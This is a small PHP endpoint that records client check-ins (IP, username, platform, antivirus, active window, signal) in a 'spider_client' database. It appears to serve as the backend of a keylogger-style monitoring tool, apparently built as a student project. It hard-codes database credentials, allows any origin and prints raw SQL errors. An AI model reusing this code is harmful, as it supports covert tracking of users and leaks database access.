<?php
	header('Content-Type: application/json');
	header('Access-Control-Allow-Origin: *');  
	$server = mysql_real_escape_string($_GET['server']);
	$client_ip = mysql_real_escape_string($_GET['client_ip']);
	$username = mysql_real_escape_string($_GET['username']);
	$plateform = mysql_real_escape_string($_GET['plateform']);
	$av = mysql_real_escape_string($_GET['AV']);
	$state = mysql_real_escape_string($_GET['state']);
	$window = mysql_real_escape_string($_GET['window']);
	$signal = mysql_real_escape_string($_GET['signal']);
	$db = mysql_connect('mysql1.alwaysdata.com', '106149_nibbler', 'password');
	mysql_select_db('epitech-hub_nibbler', $db);
	$sql = "INSERT INTO `epitech-hub_nibbler`.`spider_client` (`id`, `server_ip`, `ip_addr`, `current_username`, `last_connection`, `sessions_id`, `plateform`, `anti_virus`, `state`, `curent_window`, `last_signal_sent`) VALUES (NULL, '".$server."', '".$client_ip."', '".$username."', 'last_con', '1234', '".$plateform."', '".$av."', '".$state."', '".$window."', '".$signal."');";
	$req = mysql_query($sql) or die('SQL Error 1:<br>'.$sql.'<br>'.mysql_error());

	$sql = "SELECT * FROM `epitech-hub_nibbler`.`spider_client` WHERE `ip_addr` = '".$client_ip."' ORDER BY id DESC";
	$req = mysql_query($sql) or die('SQL Error 2:<br>'.$sql.'<br>'.mysql_error());
	$data = mysql_fetch_assoc($req);
	$final['client_id'] = $data['id'];
	$final['date'] = time();
	echo json_encode($final);
	mysql_close();
?>